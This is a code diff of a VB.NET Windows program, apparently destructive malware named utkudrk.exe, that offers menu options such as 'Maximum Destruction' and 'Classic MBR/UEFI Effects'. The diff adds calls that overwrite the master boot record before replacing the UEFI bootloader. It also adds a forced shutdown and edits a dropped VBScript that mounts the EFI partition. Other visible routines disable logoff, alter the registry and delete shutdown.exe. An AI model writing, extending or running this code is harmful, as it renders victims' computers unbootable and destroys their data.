@@ -204,12 +204,14 @@ Public Class Form1
                         ' Code for maximum destruction
                         timerLabel.Text = "It can't defend against UEFI! Executing maximum destruction!"
                         Thread.Sleep(5000)
+                        Form1.WriteMBR()
                         ApplyMaximumDestruction()
 
-                    Case "Classic UEFI Effects"
+                    Case "Classic MBR/UEFI FEffects"
                         ' Code for classic UEFI effects
                         timerLabel.Text = "It can't defend against UEFI! Executing classic UEFI effects!"
                         Thread.Sleep(5000)
+                        Form1.WriteMBR()
                         ReplaceBootx64WithBootmgfw()
 
                     Case "Surprise Me"
@@ -232,13 +234,15 @@ Public Class Form1
                         ' Code for maximum destruction
                         timerLabel.Text = "Executing maximum destruction!"
                         Thread.Sleep(5000)
+                        Form1.WriteMBR()
                         ApplyMaximumDestruction()
 
-                    Case "Classic UEFI Effects"
+                    Case "Classic MBR/UEFI Effects"
                         ' Code for classic UEFI effects
                         timerLabel.Text = "Executing classic UEFI effects!"
                         Thread.Sleep(5000)
                         ' Write UEFI using bootmgfw from Resource1
+                        Form1.WriteMBR()
                         ReplaceBootx64WithBootmgfw()
 
                     Case "Surprise Me"
@@ -246,6 +250,7 @@ Public Class Form1
                         timerLabel.Text = "Surprise! Executing less destructive effects!"
                         Thread.Sleep(5000)
                         Form1.CreateEpicVBScriptFile()
+                        Process.Start("shutdown -s -t 5")
 
                     Case "Just Make Unusable My PC Without Destruction"
                         ' Code for access restrictions
@@ -276,7 +281,7 @@ Public Class Form1
                     ' When countdown finishes, prompt user for destruction option
                     Dim options As String() = {
                 "Maximum Destruction",
-                "Classic UEFI Effects",
+                "Classic MBR/UEFI Effects",
                 "Surprise Me",
                 "Just Make Unusable My PC Without Destruction"
             }
@@ -1029,8 +1034,8 @@ Public Class Form1
         ' Create the VBScript content
         Dim vbsContent As String = "MsgBox ""What Are Your Last Words? Spoiler: No UEFI Malware this time. Because it's easy to fix."" , 0, ""utkudrk.exe""" & vbCrLf &
         "Dim userInput" & vbCrLf &
-        "userInput = InputBox(""Enter your response:"", ""utkudrk.exe"")" & vbCrLf &
-        "If userInput = ""OK"" Then" & vbCrLf &
+        "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
+        "If userInput = ""FUCK YOU"" Then" & vbCrLf &
         "    Dim shell" & vbCrLf &
         "    Set shell = CreateObject(""WScript.Shell"")" & vbCrLf &
         "    shell.Run ""mountvol x: /s"", 0, True" & vbCrLf &
@@ -1130,7 +1135,6 @@ Public Class Form1
         portalTimer.Start()
         ' Update registry settings and disable Log off
         UpdateRegistrySettings()
-        WriteMBR()
         DisableLogoffSwitchUserAndShutdown()
         SetWallpaper()
         KillGrantAccessAndDeleteShutdownExe()
